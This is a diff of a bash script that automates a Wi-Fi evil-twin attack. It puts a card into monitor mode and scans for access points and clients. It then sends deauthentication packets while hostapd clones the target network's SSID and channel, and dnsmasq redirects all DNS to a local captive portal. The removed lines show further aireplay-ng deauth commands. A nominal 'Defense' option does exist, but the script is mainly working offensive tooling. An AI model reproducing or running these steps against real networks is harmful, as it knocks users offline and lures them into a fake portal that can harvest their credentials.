@@ -1,9 +1,45 @@
 #!/bin/bash
 
+
+
 #Check if user is root
 if [ "$(id -u)" != "0" ]; then
    echo "This script must be run as root" 1>&2
    exit
+fi
+
+clear
+
+echo "Welcome"
+echo "Choose an option"
+echo "1. Attack"
+echo "2. Defense"
+echo "3. Cleaning"
+read -p "Enter your choice: " choice
+#if the choice is not 1, 2 or 3, exit
+if [ $choice -ne 1 ] && [ $choice -ne 2 ] && [ $choice -ne 3 ]; then
+    echo "Invalid choice"
+    exit
+fi
+
+
+
+# If the choice is 3 , run cleansing.sh
+if [ $choice -eq 3 ]; then
+    echo "Cleaning"
+    ./cleansing.sh
+    exit
+fi
+
+
+# If the choice is 2, run defense.py
+if [ $choice -eq 2 ]; then
+    echo "Defense"
+    echo "Enter the interface name"
+    iwconfig
+    read defenseInterface
+    python3 defense.py defenseInterface
+    exit
 fi
 
 clear
@@ -26,41 +62,7 @@ else
     exit
 fi
 
-
-
 clear
-
-# Check if interface is in managed mode
-# iwconfig $interface | grep Managed
-# if [ $? -eq 0 ]
-# then
-#     echo "Interface is in managed mode"
-# else
-#     echo "Interface is not in managed mode"
-    
-#     # Start monitor mode
-#     ifconfig $interface down
-#     iwconfig $interface mode managed
-#     ifconfig $interface up
-#     if [ $? -eq 0 ]
-#     then
-#         echo "Managed mode started"
-#     else
-#         echo "Managed mode failed to start"
-#         exit
-#     fi
-# fi
-
-
-# clear
-
-
-# Perform a WLAN scan and get the SSID , the MAC address and the channel
-# iwlist $interface scan | grep -i "ESSID" > ssid.txt 
-# iwlist $interface scan | grep -i "Address"  > mac.txt
-# iwlist $interface scan | grep -i "Channel" > channel.txt
-# paste ssid.txt mac.txt channel.txt | column -t
-
 
 
 # Check if interface is in monitor mode
@@ -73,8 +75,11 @@ else
     
     # Start monitor mode
     ifconfig $interface down
+    sleep 1s
     iwconfig $interface mode monitor
+    sleep 1s
     ifconfig $interface up
+    sleep 1s
     if [ $? -eq 0 ]
     then
         echo "Monitor mode started"
@@ -84,71 +89,60 @@ else
     fi
 fi
 
-# terminal -e "airodump-ng $interface"
-##  wifi_scanner.py should be used here
+
+# run script to scan ap's around 
 python3 wifi_scanner.py $interface
 
-echo "Enter the BSSID of the access point you want to attack"
-read assid
-# clear
+# get the bssid 
+assid=$(cat assid.txt)
+rm assid.txt
 
-# Exit if BSSID is not valid
-if [ -z "$assid" ]
-then
-    echo "BSSID is not valid"
-    exit
-fi
+# get the ssid
+ssid=$(cat ssid.txt)
+rm ssid.txt
 
-echo "Enter the channel you want to attack"
-read channel
+# get the channel
+channel=$(cat channel.txt)
+rm channel.txt
 
-# Exit if channel is not valid
-if [ -z "$channel" ]
-then
-    echo "Channel is not valid"
-    exit
-fi
 
-# All this should be written in python using scapy, for now we will use aircrack-ng just to see if it works.
-
-# Scan the channel of the BSSID
-echo "Scanning AP $channel"
-
-# timeout 5s airodump-ng $interface --bssid $assid --channel $channel
+# run script to scan ap users macs 
 python3 ap_scanner.py $interface $assid
 
 echo "Sending deAuth packets to the dest mac ap"
 ifconfig
-echo "Enter the other network card"
-read otherIface
-
-python3 deauth_good.py $otherIface $assid
-
-# Fake an access point with assid as BSSID and channel as channel of the AP
-# timeout 5s aireplay-ng -1 0 -a $assid -h $tarssid $interface
-echo "Starting fake access point"
-sh hostapd.sh
-sleep 8s
-sh dnsmasq.sh
-
-#enter mac address of client we want to disconnect // example of aircrack-ng
-# echo -e "\n\nEnter MAC address of victim"
-# read client_mac
-
-# python3 deauth_pkts.py $ap_bssid $client_mac 20 $interface
-
-timeout 10s aireplay-ng --deauth 0 -c $client_mac -a $ap_bssid $interface
+echo "Enter an interface to perform the attack, note that it should be different from the interface you've choose before."
+read attackerInterface
 
 
 
 
 
+# creates an pap/hostapd.conf file for hostapd to use 
+
+  echo "interface=$interface" > pap/hostapd.conf
+  echo "driver=nl80211" >> pap/hostapd.conf
+  echo "ssid=$ssid" >> pap/hostapd.conf
+  echo "hw_mode=g" >> pap/hostapd.conf
+  echo "channel=$channel" >> pap/hostapd.conf
+  echo "ignore_broadcast_ssid=0" >> pap/hostapd.conf
+
+# creates an pap/dnsmasq.conf file for dnsmasq to use
+echo "interface=$interface" > pap/dnsmasq.conf
+echo "dhcp-range=192.168.1.10,192.168.1.250,12h" >> pap/dnsmasq.conf
+echo "dhcp-option=1,255.255.255.0" >> pap/dnsmasq.conf
+echo "dhcp-option=3,192.168.1.1" >> pap/dnsmasq.conf
+echo "dhcp-option=6,192.168.1.1" >> pap/dnsmasq.conf
+echo "server=8.8.8.8" >> pap/dnsmasq.conf
+echo "log-queries" >> pap/dnsmasq.conf
+echo "log-dhcp" >> pap/dnsmasq.conf
+echo "address=/#/192.168.1.1" >> pap/dnsmasq.conf
+echo "dnsmasq -C pap/dnsmasq.conf -d" >> pap/dnsmasq.conf
 
 
-# Deauthanticate the target
-echo "Deauthing target"
-aireplay-ng -0 0 -a $assid -h $tarssid $interface
-
-#   wlx6c5ab03ab2f5
-#   32:07:4D:4D:BD:1A
-#   11
+echo "Starting the sattack"
+# Run 3 pararallel threads for the attack captive portal and dnsmasq 
+sudo python3 deauth_good.py $attackerInterface $assid &
+sudo hostapd pap/hostapd.conf  & 
+sudo sh dnsmasq.sh $interface &
+wait
